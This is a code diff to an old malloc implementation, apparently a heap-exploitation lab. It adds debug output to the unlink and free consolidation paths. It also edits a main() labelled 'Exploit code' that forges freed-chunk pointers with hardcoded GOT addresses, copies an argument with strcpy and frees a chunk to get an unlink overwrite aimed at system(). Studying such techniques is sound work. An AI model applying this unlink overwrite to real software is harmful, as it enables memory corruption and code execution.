@@ -1161,10 +1161,11 @@ static void do_check_malloced_chunk(p, s) mchunkptr p; size_t s;
       BK = FD->bk;                                                            \
       fprintf(stderr, "Outside loop. BK=%p\n", BK); \
     }                                                                         \
-    fprintf(stderr, "[-] FD=%p BK=%p\n", FD, BK); fflush(stderr);    \
+    fprintf(stderr, "[-] FD=%p BK=%p P->bk=%p P->fd=%p FD->bk=%p BK->fd=%p P=%p\n", FD, BK, P->bk, P->fd, FD->bk, BK->fd, P); fflush(stderr);    \
     P->bk = BK;                                                               \
     P->fd = FD;                                                               \
     FD->bk = BK->fd = P;                                                      \
+   fprintf(stderr, "[-] FD=%p BK=%p FD->bk(%x)=%p BK->fd(%x)=%p\n", FD, BK, &(FD->bk), FD->bk, &(BK->fd), BK->fd); fflush(stderr); \
   }                                                                           \
 }
 
@@ -1732,6 +1733,7 @@ void fREe(mem) Void_t* mem;
   mchunkptr bck;       /* misc temp for linking */
   mchunkptr fwd;       /* misc temp for linking */
   int       islr;      /* track whther merging with last_remainder */
+  int flag = 0;
 
   fprintf(stderr, "Calling free() on %p\n", mem); fflush(stderr);
 
@@ -1778,9 +1780,10 @@ void fREe(mem) Void_t* mem;
 
   islr = 0;
 
-  fprintf(stderr, "[x] About to perform backward consolidation\n"); fflush(stderr);
+  fprintf(stderr, "[x] About to perform backward consolidation. hd=%lx\n", hd); fflush(stderr);
   if (!(hd & PREV_INUSE))                    /* consolidate backward */
   {
+    flag = 1;
     prevsz = prev_size(p);
     p = chunk_at_offset(p, -prevsz);
     sz += prevsz;
@@ -1790,10 +1793,15 @@ void fREe(mem) Void_t* mem;
     else
       unlink(p, bck, fwd);
   }
+  if (flag == 1) {
+    fprintf(stderr, "[x] Backward consolidation performed\n"); fflush(stderr);
+    flag = 0;
+  }
   
   fprintf(stderr, "[x] About to perform forward consolidation\n"); fflush(stderr);
   if (!(inuse_bit_at_offset(next, nextsz)))   /* consolidate forward */
   {
+    flag = 1;
     sz += nextsz;
     
     if (!islr && next->fd == last_remainder)  /* re-insert last_remainder */
@@ -1803,6 +1811,10 @@ void fREe(mem) Void_t* mem;
     }
     else
       unlink(next, bck, fwd);
+  }
+  if (flag == 1) {
+    fprintf(stderr, "[x] Forward consolidation performed\n"); fflush(stderr);
+    flag = 0;
   }
 
 
@@ -2557,9 +2569,11 @@ int main(int argc, char **argv)
 {
   char *first, *second, *third, *fourth, *fifth, *sixth;
   int i;
+  int puts_got = 0x0804b128;
+  int system_got = 0x0804c150;
 
   fprintf(stderr, "Allocating space for first\n"); fflush(stderr);
-  first = malloc(strlen(argv[2])+1);
+  first = malloc(50);
   fprintf(stderr, "Allocating space for second\n"); fflush(stderr);
   second = malloc(1500);
   fprintf(stderr, "Allocating space for third\n"); fflush(stderr);
@@ -2579,6 +2593,7 @@ int main(int argc, char **argv)
   /* ================================================================================================ */
   /* Exploit code */
   char *t = fourth;
+
   int *tt;
   i = fifth-fourth;    // at the data portion of `fifth` we have its FD and BK now that its been freed
   t += i;
@@ -2587,7 +2602,7 @@ int main(int argc, char **argv)
   tt = (int *)t;
   *tt = (int)first - 8;
   tt += 1;
-  *tt = 0x45464748;
+  *tt = (int)system_got;
 
 
 
@@ -2595,7 +2610,8 @@ int main(int argc, char **argv)
   strcpy(fourth, argv[1]);
   free(second);
 
-
+  fprintf(stderr, "[x] About to call puts\n"); fflush(stderr);
   printf("dynamite failed?\n");
+  system("ls");
 }
 
